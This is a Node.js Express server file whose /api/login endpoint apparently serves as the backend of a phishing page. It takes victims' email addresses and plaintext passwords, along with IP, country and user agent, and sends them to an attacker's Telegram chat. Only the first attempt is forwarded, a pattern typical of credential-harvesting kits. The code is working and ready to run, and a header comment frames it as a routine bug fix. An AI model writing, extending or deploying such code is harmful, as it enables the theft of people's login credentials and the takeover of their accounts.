// server/index.js
// Final fix: Wraps the Telegram message content in a MarkdownV2 code block.
// This prevents any special characters in the user data from breaking the API call.

const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

require('dotenv').config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. The /api/login endpoint will not forward messages until these are configured.');
}

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

function getIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : 'unknown';
}

app.post('/api/login', async (req, res) => {
  try {
    console.log('--- /api/login called ---');
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);

    const { email, password, userAgent, country } = req.body || {};
    const ip = getIp(req);

    if (!email || !password) {
      console.warn('Validation failed: missing email or password');
      return res.status(400).json({ error: 'Missing email or password' });
    }

    const isFirstAttempt = req.headers['x-first-attempt'] === '1';
    console.log('isFirstAttempt:', isFirstAttempt);

    const now = new Date();
    const timeString = now.toISOString();
    const localTime = now.toString();

    // --- FIX: Use a code block for the data to prevent markdown errors ---
    // The content inside the ``` block is treated as plain text by Telegram.
    const dataBlock = [
      `Email: ${String(email)}`,
      `Password: ${String(password)}`,
      `IP: ${String(ip)}`,
      `Country: ${String(country || '')}`,
      `User-Agent: ${String(userAgent || '')}`,
      `Time (UTC): ${timeString}`,
      `Server Time: ${localTime}`
    ].join('\n');

    const text = '*Login Attempt Received*\n```\n' + dataBlock + '\n```';

    if (!isFirstAttempt) {
      console.log('Not first attempt — not forwarding to Telegram.');
      return res.status(200).json({ forwarded: false, reason: 'not_first_attempt' });
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('--- Login attempt (not forwarded), set TELEGRAM env to forward ---');
      console.log(text);
      return res.status(200).json({ forwarded: false, warning: 'telegram_not_configured' });
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2',
      text
    };

    console.log('Sending message to Telegram API at', url);
    const tgRes = await axios.post(url, body, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 10000
    });

    const tgJson = tgRes.data;
    console.log('Telegram API response:', tgJson);

    if (!tgJson.ok) {
      console.error('Telegram API error:', tgJson);
      return res.status(502).json({ error: 'Telegram API error', details: tgJson });
    }

    console.log('Forwarded to Telegram successfully.');
    return res.json({ forwarded: true });
  } catch (err) {
    console.error('Error handling /api/login', err);
    return res.status(500).json({ error: 'server_error', message: err.message || String(err) });
  }
});

// The 'escapeMarkdown' function is no longer needed with this approach, so it can be removed.

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT} — open http://localhost:${PORT}`);
});
